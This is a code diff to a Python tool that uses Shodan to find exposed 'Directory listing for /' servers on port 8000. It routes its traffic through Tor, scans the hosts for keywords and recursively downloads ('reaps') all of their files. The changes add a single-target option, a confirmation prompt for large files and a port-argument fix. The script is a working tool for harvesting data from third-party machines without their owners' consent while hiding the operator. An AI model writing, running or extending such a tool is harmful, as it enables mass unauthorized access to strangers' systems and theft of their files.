@@ -129,7 +129,7 @@ def key_words(content,ip_addr):
     return word_found
 
 
-def do_request(reap,notor,ig_hist,port):
+def do_request(reap,notor,ig_hist,port,targ):
     # Setup session
     s = requests.Session()
     pre = requests.get("http://icanhazip.com")
@@ -143,9 +143,13 @@ def do_request(reap,notor,ig_hist,port):
             print("If you are not running tor specify -t")
             exit()
 
-    fp = open("result.txt", "r")
-    targets = fp.readlines()
-    fp.close()
+    if(targ==False):
+        fp = open("result.txt", "r")
+        targets = fp.readlines()
+        fp.close()
+    else:
+        targets = []
+        targets.append(targ)
     fp = open("history.txt", "r")
     history = fp.readlines()
     fp.close()
@@ -180,7 +184,7 @@ def do_request(reap,notor,ig_hist,port):
 
 
 def harvest(s,ip,content,working_file,X,port):
-    if(X == False):
+    if(X == False and working_file != "/"):
         print(f"\nDir: {working_file} contains:")
         for line in content.split("\n"):
             if("<a href=\"" in line):
@@ -201,15 +205,25 @@ def harvest(s,ip,content,working_file,X,port):
             if("/" in file):
                 print("Crawling: "+working_file+file)
                 rep = s.get(f"http://{ip}:{port}{working_file}{file}")
-                harvest(s,ip,rep.content.decode(),working_file+file,X)
+                harvest(s,ip,rep.content.decode(),working_file+file,X,port)
                 if not os.path.exists(ip+working_file+file):
                     os.makedirs(ip+working_file+file)
             else:
-                print(f"Getting: {file}")
-                rep = s.get(f"http://{ip}:{port}{working_file}{file}",stream=True, timeout=30)
-                w_file = open(f"{ip}{working_file}{file}",'wb')
-                w_file.write(rep.content)
-                w_file.close()
+                lf = False
+                hd = s.head(f"http://{ip}:{port}{working_file}{file}")
+                hdr = hd.headers
+                if(int(hdr['Content-Length'])>5000000):
+                    lf = True
+                    print(Fore.RED+f"Warning: {file} is large ({hdr['Content-Length']} Bytes)")
+                    dl = input(Fore.RESET+"Proceed with download? (Y/n)> ")
+                if(lf and dl.upper() == "N"):
+                    print(f"Aborting download on {file}")
+                else:
+                    print(f"Getting: {file} Size: {hdr['Content-Length']}")
+                    rep = s.get(f"http://{ip}:{port}{working_file}{file}",stream=True, timeout=30)
+                    w_file = open(f"{ip}{working_file}{file}",'wb')
+                    w_file.write(rep.content)
+                    w_file.close()
 
     	
 
@@ -225,9 +239,10 @@ if __name__ == "__main__":
     parser.add_argument('-s','--scan',action='store_true',help="Conduct scans and enumeration of targets in result.txt")
     parser.add_argument('-r','--reap',action='store_true',help="If positive enumeration reap all files from target")
     parser.add_argument('-x','--full',action='store_true',help="Full send it all")
-    parser.add_argument('-t','--notor',action='store_true',help="Dont use tor")
+    parser.add_argument('-n','--notor',action='store_true',help="Dont use tor")
     parser.add_argument('-i','--ig_hist',action='store_true',help="Ignore history file")
     parser.add_argument('-p','--port',help="Specify port number (Default 8000)")
+    parser.add_argument('-t','--target',help="Specify a target to Scan/Reap")
     args=parser.parse_args()
     # conduct the shodan query to get the results
     reap = (args.reap or args.full)
@@ -238,8 +253,14 @@ if __name__ == "__main__":
             do_query(setup_api(), 'Title:"Directory listing for /" port:8000')
         sleep(1.0)
     # perform the requests which will loop through the results in results.txt
+    if(args.target):
+        if(args.port):
+            do_request(args.reap,args.notor,True,args.port,args.target)
+        else:
+            do_request(args.reap,args.notor,True,"8000",args.target)
+
     if(args.scan or args.full):
         if(args.port):
-            do_request(args.reap,args.notor,args.ig_hist,args.port)
+            do_request(args.reap,args.notor,args.ig_hist,args.port,False)
         else:
-            do_request(args.reap,args.notor,args.ig_hist,"8000")
+            do_request(args.reap,args.notor,args.ig_hist,"8000",False)
